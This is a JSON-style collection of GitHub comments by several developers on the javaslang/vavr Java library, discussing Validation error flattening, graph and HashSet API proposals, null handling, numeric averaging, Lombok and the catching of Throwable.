    "io7m": "For the record, I tend to rewrite flatten :: Validation<List<List<E>>, T> -> Validation<List<E>, T> every time I use Validation, so perhaps something more generally typed than that would be useful.\n. Ok, so here's the intuitive example of using Validation to validate a trivial configuration format loaded from Java Properties. You have a mix of keys that can have integer values, string values, list-of-integer values, and list-of-string values. It makes sense for the scalar-valued keys to return a Validation that has a single error value, because there's really only one thing that can fail in each case. It makes sense for the list-valued keys to return a Validation that has a list of error values because there can be multiple errors present when parsing a list:\nhttps://gist.github.com/io7m/8b8bf4c208e9a067a87786e8d8499097\nUnfortunately, it appears that doing this requires some gymnastics to repeatedly either flatten or unflatten the errors to get the right type for the monadic bind, or for combining the validation values. It's also necessary to flatten the result of the ap call, because noone wants to be dealing with a list of a list of errors!\nIt might seem slightly better to instead just use a list of errors everywhere, and arguably it is slightly better:\nhttps://gist.github.com/io7m/fd64fe18f9a94e83c1b64101e122aa1d\nThere's less in the way of flattening and unflattening lists of errors, but the manipulation that is there seems slightly more painful. The final call to ap still needs to be flattened.\nNote that I've not even run this code. It type checked so I assume that it's correct! :smile: \n. Here's a small one:\npublic static Validation<List<RouteError>, List<RouteDirection>> parse(\n    final String text)\n  {\n    return Validation.sequence(List.of(text.split(\";\")).map(name -> {\n      try {\n        return Validation.valid(RouteDirection.of(name));\n      } catch (final IllegalArgumentException e) {\n        return Validation.invalid(\n          List.of(RouteError.of(e.getMessage(), Optional.of(e))));\n      }\n    })).map(List::ofAll);\n  }\nWith the Seq change, that could become:\npublic static Validation<Seq<RouteError>, Seq<RouteDirection>> parse(\n    final String text)\n  {\n    return Validation.sequence(List.of(text.split(\";\")).map(name -> {\n      try {\n        return Validation.valid(RouteDirection.of(name));\n      } catch (final IllegalArgumentException e) {\n        return Validation.invalid(\n          Vector.of(RouteError.of(e.getMessage(), Optional.of(e))));\n      }\n    }));\n  }\n... and with the addition of an invalid static method (probably with a different name to please the type checker) that wraps the given single value in a sequence, it could become:\npublic static Validation<Seq<RouteError>, Seq<RouteDirection>> parse(\n    final String text)\n  {\n    return Validation.sequence(List.of(text.split(\";\")).map(name -> {\n      try {\n        return Validation.valid(RouteDirection.of(name));\n      } catch (final IllegalArgumentException e) {\n        return Validation.invalid(RouteError.of(e.getMessage(), Optional.of(e));\n      }\n    }));\n  }\nI find myself writing that last one pretty frequently as I'm almost never returning a Validation with an error type that isn't a sequence of some sort.\n. Which nullability annotations to use is still quite a serious problem in Java...\nhttp://io7m.github.io/jnull/documentation/p2s1.xhtml\n(This is in no way intended to suggest that mine should be used!). > FYI, be careful not to mix annotations meant to be used at runtime for constraints validation on beans or user-originated stuffs like that\nYep, I did make that point in the documentation. None of the annotations have consistent retention semantics.\n\n\u2026 even though I'm not really sure your yet another module is going to make things simpler\n\nIt absolutely isn't, but it at least gives me something consistent to use across all of my own packages.\n\njsr305\n\nStill has issues in Intellij IDEA, unfortunately. You can't use a custom NonNullByDefault annotation and have to use Intellij's \"proprietary\" annotations instead to get the same effect.\nAs I said, I'm absolutely not suggesting to use the io7m annotations. I pointed at that page in the documentation because I know of nowhere else that's listed the issues.. Value types will almost certainly introduce a concept of non-nullability at the VM level, anyway. Maybe they'll extend that to reference types some day.. Not sure how I keep missing these. I've installed the idea-settings.jar but something seems to be wrong with the IDE...\nWill fix!. I did consider it, but I thought that indexOf was more primitive and therefore would limit the scope of what's being tested a little more than the use of a higher level function would.\nIt's up to you whether it gets rewritten or not, I'll do it if you think it needs doing.. ",
    "grzesiek-galezowski": "Hi, just wanted to ask, are you planning to give some more options to convert Try to Validation? For example, there is Validation.fromEither, but not something like Validation.fromTry.. Thanks, I'll try to prepare something!. Thank you for the review and comments! Hopefully, I managed to address them.. ",
    "Ramblurr": "I have an application that is short lived. It is booted up, does some work, and then exits.\nI'm using javaslang Future, and the defaule ExecutorService seems to be preventing the JVM from exiting cleanly. Is there any way to get a handle on the ExecutorService instance so I can call shutdown?\nanswering my own question: the DEFAULT_EXECUTOR_SERVICE is part of the public interface so you can grab it directly with Future.DEFAULT_EXECUTOR_SERVICE. A mandatory timeout on await() sounds good to me. Thanks for looking into this.. looking forward to the fix.. ",
    "nicolaferraro": "Related to https://github.com/javaslang/javaslang/issues/1531\n. Yeah, transformValue is the best choice. I'm going to apply the changes.\n. Only an issue with the transformValue function. I used this one:\njava\ndefault <U> Future<U> transformValue(Function<? super Try<T>, ? extends Try<? extends U>> f)\nChanging it to:\njava\ndefault <U> Future<U> transformValue(Function<? super Try<? super T>, ? extends Try<? extends U>> f)\n... is probably more correct, but forces me to add unchecked casts in every point I use the transformValue function.\n. ",
    "jbduncan": "FYI, Guava have recently released a graph API of their own (see com.google.common.graph.* in their 20.0-rc1 javadocs).\nIt's neither a persistent graph API nor does it seem to borrow from functional principles, but it might prove to be a source of inspiration.\n. Because I'm heavily biased (:wink:), I strongly suggest having a look at Guava's Graph API if it hasn't been looked at by the Vavr team already. (https://javadoc.io/doc/com.google.guava/guava/23.1-jre)\nIMO, it has some interesting design decisions which should at least be taken into consideration before this issue is closed.. Hi @danieldietrich - I realise that this goes against @emmanueltouzery's earlier opinion, but I'd find at least some modularisation to be a useful incentive for adopting Vavr; specifically, making at least the core and control packages their own module/jar and collections and concurrent a module/jar on top of that.\nFrom my perspective, functional persistent collections are intriguing but I've yet to become comfortable with the idea of using them in any of my personal projects or introducing them to my colleagues, whereas I'm convinced of the value of Try, and I could possibly also be convinced of the value of Either and Option once I get to grips with them.\nDo you have any thoughts regarding this? :). Okay, those are totally fair reasons to avoid splitting up Vavr! Thank you very much for responding to my comment. :). ",
    "chb0github": "Everytime I have put some time into this effort I try to make it fluent and don't inherently have a given algorithm in mind. What's most import is that it's searchable and fluently create able. By making them interfaces, we can defer the search functionality to a Lucene implementation or, if someone wants to try their hands, they can try to parallelize/distribute this with a different implementation.\nI always modeled it something like a builder interface:\n```\n  interface Graph extends Traversable {\nNode addNode(String name);\nNode addNode(String name, Map<String,Object> properties);\n\n\n/**\n * Maybe represent a subgraph?\n * @param query The query to apply. This might be too highlevel\n * @return a Graph representing all nodes found.\n */\nGraph findNode(Predicate<Node> query);\n\n// because these searches are by nature stateful, you want a new instance every time\nSupplier<UnaryOperator<Node>> SHORTEST_PATH = n -> ...// implement dykstra\nSupplier<UnaryOperator<Node>> DFS = n -> ...\nGraph traverse(UnaryOperator<Node> traverseFunction);\n\n}\ninterface Node {\n/**\n * add a property to 'this'\n * @param name obvious\n * @param value anything you want\n * @return this\n */\nNode withProperty(String name, Object value);\n\n/**\n * Add a relationship between 'this' and other\n * @param other the thing to relate to\n * @return the new relationship.\n */\nRelationship relatesTo(Node other);\n\n/**\n *\n * @return the graph it is represented in. Assumes a node instance may only exist in 1 graph\n * which gives pause to representing a graph as a collection of subgraphs\n */\nGraph andThen();\n\n}\ninterface Relationship {\n/**\n * Add a property to the relationship with a weight\n * @param name obvious\n * @param value obvious\n * @return this\n */\nRelationship withProperty(String name, Object value);\n\n}\n\nGraph g = Graph.empty().addNode(\"node1\", Map.of(\"a\",1)).addNode(\"node2\",Map.of(\"b\",2))\nGraph g2 = g.traverse(Graph.DFS.get());\nGraph g3 = g.find(n -> n.hasProperty(\"b\")); // but you definitely want much slicker search\n```\nTotally incomplete, but the most crucial thing is it's searchable. \n. I have had a in-progress implementation of this but as I have been so busy I don't know when I will get around to it. Should I create a PR to begin a discussion on it? It's total WIP. . I can push what I have and you can see what I have done and commented. I already started. \nAs for directed and not, I actually eliminated that as a dedicated thing and just made it so when you added an edge between nodes with directed it created the relationship between nodes. There was no specific flag identifying the relationship as bi-di. The reason I did this is, if you wanted to remove one of those directions you would have to also have to update the property on the reltionship. A \"bi-di\" relationship is just 2 relationships and not some special one.\nI had imaged traversal functions like Stream<Node> Graph.traverse(dfs()) making it a stream return to have it handle large data sets more effectively. The java \"architects\" should never have introduced checked exceptions into the compiler - exceptions are not checked in the VM - which is why scala/kotlin can run on the JVM and not have any at all. \nIf using sneaky throws can introduce an essentially unrecoverable problem then, sadly, it must be excluded. If excluding it means uglier code ... well, welcome to Java. It's a risky proposition in a library\nJust my .02$ - . My confidence that this is possible is nearly 100% - I have done it in the past. There are 2 different ways to do it:\nOne is with a UserType which is generally applied on the field being bound with @Type( VavrType.class) - The basics are: Given a result set, construct the result to be bound to the object field and return it - should be no problem to integrate.\nOption 2 is anTypeDescriptor. I have never used these. \nThe option to use is the one that requires nothing more than the dependency being dropped in and that's it. We should model it on how hibernate support for hibernate-java8 was implemented. It takes care of things like Instant which are immutable as well as Optional and Stream. \nOnce a strategy is developed a new repository would be created that just has necessary hibernate dependencies discovered at runtime so it isn't version bound - these 2 approaches seem to have been around forever so that's a safe approach for portability\n. As I thought about it more, ideally such a package would support options 1 and 2 so that the user may choose.. Yeah, that'd be great! Thanks. Not sure if I somehow forgot to mention:\nYeah, sure. Sign me up\nChristian\nOn Fri, Jun 30, 2017 at 12:39 AM Daniel Dietrich notifications@github.com\nwrote:\n\n@chb0github https://github.com/chb0github I added a new repository\nvavr-io/vavr-hibernate and a new developer team to the Vavr organization.\nMay I add you to the Vavr organization and to the new team in order to\nstart with vavr-hibernate?\n\u2014\nYou are receiving this because you were mentioned.\nReply to this email directly, view it on GitHub\nhttps://github.com/vavr-io/vavr/issues/2022#issuecomment-312198257, or mute\nthe thread\nhttps://github.com/notifications/unsubscribe-auth/ABaI0Kobhdl3LfpS7GJrsSNCq-_YkDReks5sJKYbgaJpZM4OI4Jp\n.\n. Did you mean another repo? Seems a bit premature given the link you refer to is only exploratory - Java is littered with good ideas gone nowhere. My thinking would be to hold off until it's actually something at least in draft in the JCP. At this point you wouldn't know what you're even trying to target.. A HashSet is near O(1) access - the default java implementation is actual O(load factor) which defaults to .75n. EnumSet in java definitely is O(1) because it uses the enum ordinal to index an array. The only way you can EVER achieve true O(1) access on a set is if the data is in a fixed domain bound (like a collection of enums). A general purpose hash can't do that but can get close enough\n\nAs for your order preserving requirement, I assume you mean iteration order - that's trivially implemented now with Java LinkedHashSet backed by a LinkedList\nSo: A vavr implementation would be a io.vavr.List + io.vavr.immutable.HashSet. The only addition would be to add the \"before and after\" indices for each entry so you can remove an element and connect the 2 elements in the LinkedList in O(1).\nBasically what I am saying is: you're over thinking it. Implement a vavr version of a java LinkedHashSet and you're off to the races. @dmolesUC3 Unless I am reading something different the run time for a HashMap in plain java is f * O(n) where f is the load factor. The default is .75. This is a classic implementation and is pretty easy to visualize: in an empty hash table any particular entry has a 1/t probability of colliding with a previous entry and thus requiring a resolution phase like mod-prob or linked list. Stands to reason that the more elements you put into a fixed size HashMap or set the more likely there is a collision such that it approaches O(N). The entries from wikipedia make it pretty clear that for a uniform, randomly distributed hash, this is amortized O(1)\nThe Linked part of LinkedHashSet is for iteration order . if you use the hash table to lookup the nodes to manipulate in the linked list that backs it, you can insert, delete and update in O(1) too. \nDebate this point all you want - refer back to the above links when you do.\nAll I am saying is that you're overthinking the implementation. . Set doesn't not have an index. They are not numbered. So, you don't. Maybe I don't understand what the objective is. Hashing is, by it's nature, not indexable. I mean what would set.elementAt(1) retrieve? The element in the table at position 1 assumes\n\nThe underlying table even has something at position 1\nIs based on an indexable structure like an array\n\nAre you trying to have a Set with a predictable iteration order? That's perfectly reasonable and it's because of this you could fake it. So, if you would expect that set.elementAt(1) would retrieve the 1st element in an iteration order than that's fine and useful.. Ok, now I get what you're after. Maybe just having an interface ofIndexedand thenIndexedSetandListandVectoralready implementIndexedwhere asSetdoes not butIndexedSetdoes\n. I may have already answered myself withHashSet.distinctBy(Function<? super T> keyExtractor)`\nWhich makes for a fluent function like HashSet.distinctBy(MyObject::id).add(new MyObject(1));. @ruslansennov Something close already exists: HashSet.distinctBy(MyObject::getId).of(new MyObject()); But it doesn't appear that the resultant set from that call actually returns a HashSet where the hashing is based on the result of the function.\nAs for hash/equals - Yes, I could do that; it's Java 101. To do that would require me modifying the original object or creating a new object. And, if we are following the java equals/hash bible, then equals must reject any subclass.\nThis would be an easy implementation. HashSet would contain a Function that would extract the key with every call and pass it along for the hash/equals compute. \nIn the constructor you would have \n```\nprivate HashSet(Function<? super T, ?> keyExtractor) {\n   this.keyExtractor = keyExtractor\n}\nprivate HashSet() {\n   this(Function.identity());\n}\n```\n```\n@Getter\n@AllArgsConstructor\n@EqualsAndHash \npublic class MyObject {\n     private Integer id;\n     private String something;\n}\nSet mySet = HashSet.keyedBy(MyObject::getId).add(new MyObject(1,\"foo\"));\nmySet.contains(new MyObject(1,null); // true, second argument is ignored\nSet oldSet = HashSet.keyedBy(MyObject::getId).add(new MyObject(1,\"foo\"));\noldSet.contains(new MyObject(1,null)); // false, assuming it doesn't blow up with a null\n```\nI am looking for functional parity with TreeSet\nBasically, a method to override identity without defining a new object. Just like TreeSet\nIt seems like HashSet.distinctBy comes close to filling the role but it's like a view.. - The memory usage part is a bit puzzling - I imagine a single variable reference added. But, technically, yes it would increase the memory footprint. \n- It would also, technically, reduce runtime by the functional call the extract the key with every call. \nI concede these points but see them as not detrimental. \nYou're alternatives counter points:\n- This doesn't address the point of the proposal: I may not be in control of that and overriding these methods in a subclass would (again, following strict java guidelines) fail equality\n- Wrapper class is same as last bullet point. Since you would need to override 2 functions then it makes a simple functional approach to wrapping the object trickier. \n- Agree. Just more verbose\n- As I suggested in a follow up, this might work. But when I looked at the code it looks more like a 1-time view of the data. \nWhen I look at how it's currently done the hashCode is determined based on the key input and thus this should/would be a transparent change.\nUsing a HashMap is essentially the same but more verbose (IMO) - I also thought of a downside to my own thoughts (just to prove I am reasonable): Once the set is created with such a function it would be entirely lost that it's not behaving as the default set. Then again, this case exists for TreeMap too. \nThe whole idea is for sake of convenience and code brevity. Since it's your show @danieldietrich if you're entirely against the idea then just close the ticket. \n. Is there an issue this fixes? Or are you just improving upon the pom's?. I like @nfekete idea because it allows the data and the predicate to be tied together. . what about \n```\ninterface Iterator {\nstatic <T> Iterator<T> iterate(Supplier<? extends T> next, Predicate<? extends T> until);\n\n}\n```\nso you can do Iterator.iterate(StringUtils::randomString,s -> s.length() > 10). What do you mean? Like: List.of(null) ? Why not? . Null is an entire legitimate value for a collection - consider a JSON array:\n[1,2,null,4,5] -> If I couldn't Load this into a list as List.of(1,2,null,4,5) Then how could I ever use a collection type for serializing/deserializing?\nAs for collections that use the values added for identity purposes (HashSet,TreeSet, etc), that's why you can give it a comparator (in the case of tree-set) of TreeSet.of(Comparator.nullsFirst(Comparator.comparing(MyObject::getProperty))\nI have made a case for Something similar with HashSet.identifiedBy(MyObject::getProperty) or something similar.\nRegardless: null is a totally legitimate value. If you're expecting an exception to be thrown then you're looking at the wrong libraries - Exceptions are an anathema to functional programming as they are side-effects by design\nFor that, you could look at the apache collections and PredicatedList. . Nulls are 'bad' as in they can lead to abnormal machine state and require a lot of code to handle them. But 'null' is a totally valid state. I see no reason vavr (as a library) should treat them special. \nYou as the user can and should handle them as handling null is NOT a cross cutting concern. Burying any logic low-down in a library is ill advised. \nCan we close the ticket? . There are some limitations with this approach that don't seem to be compatible with the vavr ethos or purity. Functional programming is derived from mathematical concepts and ideas. With that in mind, this code has some gotchas\n1) It's not type safe and relies on runtime validation.\n2) Long ago I had a discussion with core Java people about why 1L and 1.1f should not be comparable at the number level. That is \"Why is Number not Comparable?\" The reason being that there can be loss of precisions and Java has to mechanisms for things like imaginary numbers. I admit, I hadn't thought of it. So, Every current core implementation of Number is Comparable but not number itself. \nWhat that gets to is that your functions doesn't handle anything you didn't implement now. What about AtomicLong ? With the current logic you would apply the Number::doubleValue but based on the the fact that Integral types (Long, Int, Byte, Short) you apply Number::longValue I assume that you would intend Number::longValue to it as well; but that won't happen. \nI admit, your code handles the common types and that's probably fine* - perhaps the real solution would be to have an overloaded function that takes function that does the proper conversion?\n```\n public T avg(Function<? extends N,? super S> transformFun); \nLong result = List.of(1,2,3).avg(Number::longValue);\nLong result2 = List.of(1,2,3).avg(); // uses logic currently\n```\nI think, ideally, if these useful methods were to be implemented, then List should get a couple of extra factory methods where in these methods are defined and they are defined properly:\nIntList ints = List.of(1,2,3);\nprivate static class IntList extends List {\n     public Integer avg() {\n        // implement avg specifically or have a 'NumericList' that takes a Function in its constructor\n        // That is applied to every value. \n        // Then have this class sub class it and pass the correct function. Averaging a series of numbers is identical functionally\n     }\n}\n```\npublic class List {\npublic static IntList of(Integer ... nums) {\n}\n}\n```\nThis approaches allows the compiler to do what it does best and conforms to polymorphic expectations. I like the simplification and I think we can actually get the compiler onboard too. The real crux of the matter is I don't like pushing off to runtime that which can be asserted at compile-time. Hence the specific subtypes for lists. List.of(\"Christian\",\"Bongiorno\").avg() fails. And yet, the compiler could have told you this! I don't know when these magical primitive generics will come out (Incase you hadn't been watching, Java 9 is on it's 10th? Delay? Current \"we really think it will work\" date for java 9 is Sept 22) but whenever it is it's far far into the future. \nI strongly encourage the subtype approach because the compiler catch a typing mistake right away we won't have to hold out until the 7th-of-never for a special java feature. \nUpdate\nSomething else occurred to me too: While public Double avg() might produce a correct result, it's also unnatural to have a series of Longs produce a Double especially if you intend to carry on with some further math. For example:\nList.of(1,2,3).avg().map(d -> d/1L).map(Long.class::cast).getOrElse(1L);\nThe average is 2 Integer, but to perform this the VM will: \nunbox d to a double, unbox 1L to a long then promote the long to a double to do the division. Then it must auto-box the result back to a Double because Java doesn't have primitive generics. The getOrElse(1L) is now actually illegal syntax without using a remapping. \nA List.of(1L,2L).avg() should produce a Long result.  I am not against what your'e doing (infact, I am in favor of simplification) but the typing issues is a very practical concern. I am sure that, given enough time, I could produce a case that would give erroneous results. . re: Java streams: I literally felt the same way and for the same reasons! And, worse, have you looked at the inheritance tree for streams? I am really hoping that Java 9 brings about something close to a total library rewrite!. Well, the discussions seems to be between you and I only - how about this compromise: Overload the avg function to take a function that can do the conversion. This allows users to override the default conversion logic should it prove necessary. This keeps the convenience in place for the people who just don't give a damn but allows for full-control to be applied if needed. The implementation is trivial.. The function would be on Traversable as I put previously. \ndefault Option<Double> average(Function<T, Double> doubleFun)\nthen use it as:\nList.of(1,2,3).average(n -> Math.round(n * 10) / 10.0);\nbut keep what you have now with:\nList.of(1,2,3).average(); \nThe implementation could be moved to the new method and the current one would just pass Number::doubleValue\nI see this as unalloyed good and easy to implement. But at 39 comments deep all I have managed to get for changes is a couple of lines. Mostly, I think, because I gave you incentive to scratch and itch :)\n. @danieldietrich Your Traversable type should not allow for mixed types for precisely reasons like this. It should just take T and let the user decide what the highest level supportable type is. \nFor this case it's unavoidable and insurmountable. Although much of the Java APIs makes me cringe, the type strictness isn't one of them. \n. If you would like to take credit for it (and we would like you to), then it should be in the form of a pull-request which is pretty trivial in GH. . @danieldietrich empirical evidence FTW. The idea is really good but did you check jetbrains youtrack? They would be the most likely place this would be tracked.. I took a slightly different approach (addressing the issue you bring up).\nMap<String, String>[] results = mapper.readValue(inputfile, Map[].class);\nUsing an [] is my preferred way to give jackson what it needs without introducing another anonymous type.\nThat does the trick. \nPreviously, when I had this issue, it failed to marshal. I am not familiar with how one makes a jackson plugin but it is possible to have it ask vavr for a Map-like thing? Then Vavr's type could be supplied.. Glad you like that syntactic trick. If you just need a collection of elements then an array does the trick without all the extra non-sense of a TypeReference to get around Java's generics mess. \nAs for the rest of it: I know jackson has callback methodology support for basically saying: \"I found this JSON_ARRAY, what type should I instantiate for it? \nBut, I am not that knowledgable on the Jackson internals either. I have a bunch of experience in this - enough to say I never got past it!\nIt's definitely possible to release to sonatype automated - I will create an issue where it can be discussed. Hmm,\nI have never heard that's it's incompatible with GWT and not sure why it\nwould be. It generates version agnostic code.\nOn Wed, Oct 11, 2017 at 3:08 AM N\u00e1ndor El\u0151d Fekete notifications@github.com\nwrote:\n\n@nfekete commented on this pull request.\nIn vavr/pom.xml\nhttps://github.com/vavr-io/vavr/pull/2136#discussion_r143966658:\n\n@@ -20,6 +20,12 @@\n     \n\n\n+            org.projectlombok\n+            lombok\n\nLombok would be especially problematic, since it's a manipulating\nbytecode, it's doing totally non-standard things, not just a regular\nannotation processor, hence it's incompatible with GWT, which Vavr supports.\n\u2014\nYou are receiving this because you were mentioned.\nReply to this email directly, view it on GitHub\nhttps://github.com/vavr-io/vavr/pull/2136#discussion_r143966658, or mute\nthe thread\nhttps://github.com/notifications/unsubscribe-auth/ABaI0BfDTddBbkTPCm9exbGRxAtUL4h_ks5srJOngaJpZM4P0kub\n.\n. I am sure you didn't mean to suggest that the places I have used it and see\nit used were not 'serious' projects.\n\nI actually submitted the PR to get some input on a graph implementation,\nnot get flamed about lombok. It's tangential to the PR. If you have\nsomething constructive to add, I am all ears.\nOn Fri, Oct 13, 2017, 6:50 PM N\u00e1ndor El\u0151d Fekete notifications@github.com\nwrote:\n\n@nfekete commented on this pull request.\nIn vavr/pom.xml\nhttps://github.com/vavr-io/vavr/pull/2136#discussion_r144683079:\n\n@@ -20,6 +20,12 @@\n     \n\n\n+            org.projectlombok\n+            lombok\n\nLombok will hook into the internal compiler code of javac and ECJ and\nmodify their internal in-memory AST representation to convince the compiler\nto generate bytecode according to the annotations you use. With the way it\nworks, you will get into trouble as soon as you'll try to use the same code\nin another compilation environment, which requires consistency at the\nsource level, since Lombok generated (byte-)code is invisible to those\ntools. While that may or may not work with GWT, since GWT also uses ECJ, it\nwill definitely break with any other transpiler or tool that parses java\nsource code. It's a total hack that can break any time also if the javac or\nECJ team decides to change some internal implementation details of their\ncompilers. Because of these, for me it's totally out of question to use it\nin any serious project.\n\u2014\nYou are receiving this because you modified the open/close state.\nReply to this email directly, view it on GitHub\nhttps://github.com/vavr-io/vavr/pull/2136#discussion_r144683079, or mute\nthe thread\nhttps://github.com/notifications/unsubscribe-auth/ABaI0BaR_3aIq8cmP4e3xkGBDypDchdDks5ssBNigaJpZM4P0kub\n.\n. I understand. It's all good\n\nOn Sun, Oct 15, 2017, 1:07 PM N\u00e1ndor El\u0151d Fekete notifications@github.com\nwrote:\n\nIf I offended you, I am truly sorry, I didn't mean to. \ud83d\ude1f\n\u2014\nYou are receiving this because you modified the open/close state.\nReply to this email directly, view it on GitHub\nhttps://github.com/vavr-io/vavr/pull/2136#issuecomment-336737758, or mute\nthe thread\nhttps://github.com/notifications/unsubscribe-auth/ABaI0C3t3QfSJeffwlyOteX4w-Kba906ks5ssmYFgaJpZM4P0kub\n.\n. I don't like how Throwable is caught either. It's can hide real significant problems - problems like what you point out. using Try.of(() -> connectToDb()) makes sense to catch errors and try again or us a circuit breaker. But an ExceptionInInitializerError means that a static block in a class threw an error and the class failed to load. Based experience it's nearly impossible to determine why (the underlying problem usually vanishes).\n\nErrors are bad and are by designed meant to not be caught: \n1. OutOfMemoryError - You can't increase JVM Heap space from inside the JVM, so now what?\n2. UnsatifiedLinkError - An attempt at a native library load failed. Was the library missing? Is it binary incompatible (which, based on experience reports as not found). \n3. NoSuchMethodError - Version compatibility error, always. This is non-recoverable. \nThe list goes on. . probably @danieldietrich Should speak to the release process and if we will allow the changes. I mean, we can talk all day but unless someone forks the code or you know a PR will make it's way in to the core then it's all academic.. Vavr doesn't need to be a java implementation of Scala's immutable libraries. The functionality vavr provides fills a very real gap in the java ecosystem and can/should vary to be ideal for the language. The Scala immutable libs are a fantastic inspiration but should be taken as only that. Not following idiomatic java will/does have ramifications everywhere. . @danieldietrich I concur with others. Throwable is just the most common super-type to all exceptions but that doesn't mean it should be caught because it includes Errors which should never be caught.\nThe VERY first sentence states this: \n\nAn Error is a subclass of Throwable that indicates serious problems that a reasonable application should not try to catch. Most such errors are abnormal conditions. The ThreadDeath error, though a \"normal\" condition, is also a subclass of Error because most applications should not try to catch it. \n\nYou're the owner @danieldietrich of vavr and if you wanna make it scala-envious that's your choice. But I think you are dismissing a lot of veteran experience and bluntly stated advice from the original Java documentation going back to 1.0.. If it is to follow the getter convention, then it should be tuple.get_1() and tuple.get_2()\nThis would cause it to manifest itself in json as \njson\n{\n   \"_1\" : \"Foo\",\n  \"_2\" : \"Baz\"\n}. Rumato: as soon as I saw it I knew it was from Scala. The whole library is\nessentially Scala envious. You're also missing that those are public\nfinal member variables which, while is legal syntax, is also generally not\ndone in Java though this use case is totally safe and quite terse.\nChanging the member symbols for tuple would be a breaking change. It should\nbe clear to you as a professional that once a standard is set it takes a\ndivine act to change it. If you weren't around when those standards were\nset you have no input. This observation doesn't just apply to vavr\nHave you seen the inner code from major spring projects? Better to focus on\nthe functional aspects that vavr provides the community at large rather\nthan the implementation details.\nOn Sat, Oct 14, 2017, 5:13 AM Rumato Estorsky notifications@github.com\nwrote:\n\nit makes sense to leave it like that\nNo it does not. There are some conventions in Java and Java devs should\nfollow them or switch to other language.\n\u2014\nYou are receiving this because you are subscribed to this thread.\nReply to this email directly, view it on GitHub\nhttps://github.com/vavr-io/vavr/issues/2140#issuecomment-336631111, or mute\nthe thread\nhttps://github.com/notifications/unsubscribe-auth/ABaI0BF8L_Ve9aT0Oc0juC9fALsMhgNaks5ssKVqgaJpZM4P5SzL\n.\n. @rkraneis this goes to issue #2137 : vavr is really trying too hard to be \"scala-for java\" and a lot of things don't make sense when you have entirely different language constructs. If you have a \"Tuple\" of airty 18 then you have a full-on class. Once you start clustering groups of values together it's called a class and Java and Scala are full of means off handling this.\n\nIMO arity of 2, 3 and maybe 4 is ok  because after that you need a class. Vavr can and should draw inspiration from Scala's collection libraries because it fills a gap in the Java native APIs. But the libraries need to target the Java platform and it's idiosyncrasies \nBTW: \nTuple: 2\nTriple: 3\nQuadruple: 4\n. A \"Tuple\" of arity 27 is a Map of something like Map.of(\"_27\",\"27th thing\") with that much arity practical use of such a \"Tuple\" is essentially 0. If you weren't the guy who wrote the original code you would have no idea what semantic value _27actual had. . I think what Daniel is saying is that vavr is intended to be a Scala\nimmutable library implementation in Java. Following a Java convention for\nsake of easy integration at the expense of being an academically pure\nexcercise is not of interest.\nThere is a vavr Jackson module, as an example. Which demonstrates that\nframework integration is possible but not for free.\nSave your breath Rumato. Your request doesn't align with the vision of vavr\nset forth by the founders.\nOn Tue, Oct 24, 2017, 2:23 AM Rumato Estorsky notifications@github.com\nwrote:\n\nI think the idea of classical Java beans does not fit well here. Beans\n(aka DTOs) need a no-arg constructor, getters and setters\nHuge amount of frameworks in JAVA rely on getVALUE methods (does not\nmatter is it purely DTOs or not) it is just a right way to get property of\nobject.\n\u2014\nYou are receiving this because you commented.\nReply to this email directly, view it on GitHub\nhttps://github.com/vavr-io/vavr/issues/2140#issuecomment-338929343, or mute\nthe thread\nhttps://github.com/notifications/unsubscribe-auth/ABaI0EdOuoDQDvYq9oHUAVzR_i0-YQYGks5svayUgaJpZM4P5SzL\n.\n. @kant111 and @hamnis this is idiosyncratic Java. In functional parlance, it isn't a function if it doesn't return anything. In Java, that's ok. It's a consumer. You have the wrong programming language in mind. Try kotlin\n\nIt has extension functions. Actually, since it a unit of time, it should be something more like (or have an overload):\nFuture<T> of(CheckedSupplier<? extends T> computation, long numUnits, TimeUnit unit)\nI had also though of Attaching a future submission to an event - in JS you can listen to events on arrays and such. So, having something like: List.of(1).onRemove(thisList -> Future.of(...)\nJust some ideas.. Better is to check for this condition first (assert precondition) by inverting the predicate if(!(head instanceof Number)) throw new UnsupportedOperationException)\nThen, you can remove the else altogether and reduce complexity and indentation. An alternative approach would be to define the translation strategy instead of having a long predicate like this. \nOption 1:\n// top of class\nprivate static Set<Class> longable = Set.of(Integer.class,Long.class,Byte.class,BigInteger.class, Short.class);\nif(longable.contains(head))\n avg = numbers.maptToLong(Number::longValue).average().getAsDouble();\nOption 2: expressly define the function by type:\n```\nMap,Function> funcs = Map.of(Integer.class,Number::longValue,Byte.class,Number::longValue,Double.class,Number::doubleValue)\nFunction,Stream> f = funcs.get(head.getClass()).orElseThrow(RuntimeException::new);\nnumber = f.apply(numbers);\n```\nOption 3 is to recognize the you can handle the simpler case more tersely:\nif(head instanceof Double || head instance of Float)\n. this else is unnecessary. Once you have done return Option.none(); the only way the rest of the code executes is as the else. Remove the else -> remove indent -> reduce complexity. Why?. How did you arrive at this magic number? I am sure it's an improvement.. Imperative isn't a crime OR a dirty word. I noticed there is a cyclomatic complexity analyzer on the build. Reducing that number seems an unalloyed improvement. \n. Sure. I am not opposed to the instanceof checks (per-se). I am saying \nif(head instanceof Double || head instanceof Float) {\n    avg = numbers.mapToDouble(Number::doubleValue).average().getAsDouble();\nelse\n   avg = number.mapToLong(Number::longValue).average().getAsDouble();\nexact same outcome, less code. \n. You should actualy include x.getMessage() as this will actually contain a message saying what type it actually had and tried to convert to. . YIKES!  A side-effect! acc[2] = acc[2] + 1. Not that I terribly care, but why declare everything final? Are you trying have the scala equivalent of val ?. Technically, this case shouldn't actually compile. . Shouldn't compile. Honestly, toss the catch statement. You're trading one exception for another and the ClassCastException says everything you need to know. Just type cast and go-for-broke. Your conditional collapse substitution is not identical to the original sample.\nThis would be the equivalence:\nif (condition1) {\n    do;\n    this;\n    and;\n    that;\n} else {\n    throw x;\n}\nif (condition2) {\n    flip;\n    flap;\n} else {\n    throw y;\n}\n```\nif (!condition1) {\n   throw x;\n}\ndo;\nthis;\nand;\nthat;\nif (!condition2) {\n    throw y;\n}\nflip;\nflap;\n```\nAnd, actually, I don't see what got lost except extraneous syntax. Principles of fail-fast, and assert pre-conditions seem to be to transcend FP v imperative. . I was just being dogmatic for sake of humor. Ok, that's puzzling then - why choose serializable and comparable? That will take us off topic. In previous tests you use @Test(expected = ClassCastException.class) but here you don't. . If your priority queue can be constructed with a customer comparator, it can, right?. I am honored. Gah! The dread ToDoubleFunction! I would LOVE to have a compiler switch that turns off primitives. catching Throwable is generally bad form as this can be Errors like OutOfMemoryError or ExceptionInInitializerError. These are considered non-recoverable and it's explicitly encouraged to exit the JVM. How about catch(Exception e) as this covers every conceivable non-error case.. I read the issue this addresses, why not actually implement it as described in the issue?. Maybe Option.tryToMap(...) ? More natural and 